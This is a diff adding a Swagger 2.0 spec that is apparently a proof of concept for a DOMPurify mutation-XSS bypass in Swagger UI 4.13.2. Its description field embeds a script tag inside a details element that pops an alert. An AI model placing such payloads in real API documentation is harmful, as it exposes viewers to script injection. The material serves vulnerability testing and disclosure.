@@ -1,0 +1,18 @@
+swagger: '2.0'
+info:
+  title: DOMPurify 2.3.10 mXSS in Swagger UI111
+  description: |
+    <details open><summary>Click me</summary>
+      <script>
+        // Swagger UI 允许 <details> 和 <script> 在某些上下文
+        alert('XSS in Swagger UI 4.13.2!');
+      </script>
+    </details>
+  version: 1.0
+paths:
+  /xss:
+    get:
+      responses:
+        '200':
+          description: OK
+
